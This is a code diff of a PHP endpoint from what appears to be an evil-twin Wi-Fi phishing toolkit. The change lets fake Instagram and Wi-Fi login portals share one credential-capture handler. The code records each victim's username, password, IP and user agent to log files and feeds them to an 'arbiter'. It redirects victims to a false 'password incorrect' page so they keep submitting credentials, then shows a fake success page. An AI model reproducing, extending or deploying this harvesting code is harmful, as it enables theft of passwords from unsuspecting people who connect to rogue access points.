@@ -1,15 +1,18 @@
 <?php
 /*
- * Instagram portal credential capture.
+ * Self-capturing portal credential endpoint.
  *
- * The stock CapCap authenticator (lib/authenticator.php) exists to verify a
+ * The stock CapWifi authenticator (lib/authenticator.php) exists to verify a
  * candidate against the target's WPA handshake. That check is meaningless for
- * a web login page, so this portal posts to its own endpoint instead: every
- * attempt is appended to instagram_credentials.log next to the portal root
- * (i.e. <CAPCAPWorkspacePath>/instagram_credentials.log) and the visitor is
- * sent back to the login form with the usual "password incorrect" notice.
- * After MAX_ATTEMPTS attempts from the same address the success page is shown
- * so the flow terminates instead of looping forever.
+ * a web login page, so the self-capturing portal families (Instagram and WiFi)
+ * post to this endpoint instead: every attempt is appended to
+ * instagram_credentials.log next to the portal root (i.e.
+ * <CAPCAPWorkspacePath>/instagram_credentials.log) and the visitor is sent
+ * back to the form with the usual "password incorrect" notice. The log keeps
+ * its historical Instagram name because the GUI and the Captive Portal
+ * arbiter already watch that path. After MAX_ATTEMPTS attempts from the same
+ * address the success page is shown so the flow terminates instead of looping
+ * forever.
  *
  * Log format, one attempt per line, tab separated:
  *   ISO-8601 time <TAB> client IP <TAB> username <TAB> password <TAB> user agent
@@ -306,19 +309,27 @@ if (!$duplicate) {
         append_plain(sys_get_temp_dir() . '/instagram_credentials.log', $line, 0600);
     }
 
-    // Mirror the pair into CapCap's own attempt file, which the Captive Portal
-    // arbiter copies into its pass log and then truncates.
-    if ($username !== '' && $password !== '') {
-        append_plain($workspace . '/pwdattempt.txt', $username . ':' . $password . "\n");
+    // Mirror the attempt into CapWifi's own attempt file, which the Captive
+    // Portal arbiter copies into its pass log and then truncates. The WiFi
+    // portals submit only a password, so a separate username is optional.
+    if ($password !== '') {
+        $attempt = $username !== '' ? $username . ':' . $password : $password;
+        append_plain($workspace . '/pwdattempt.txt', $attempt . "\n");
     }
 
     bump_counter($hitsPath);
     append_plain($ipPath, $ip . "\n");
 }
 
-$target = $attempts >= MAX_ATTEMPTS
-    ? 'final.html'
-    : 'error.html?u=' . rawurlencode($username);
+if ($attempts >= MAX_ATTEMPTS) {
+    $target = 'final.html';
+} elseif ($username !== '') {
+    // Instagram keeps the username after a rejected attempt. The WiFi pages
+    // submit only a password, so they go back to a clean error URL.
+    $target = 'error.html?u=' . rawurlencode($username);
+} else {
+    $target = 'error.html';
+}
 
 header('Cache-Control: no-store');
 header('Location: ' . $target, true, 302);
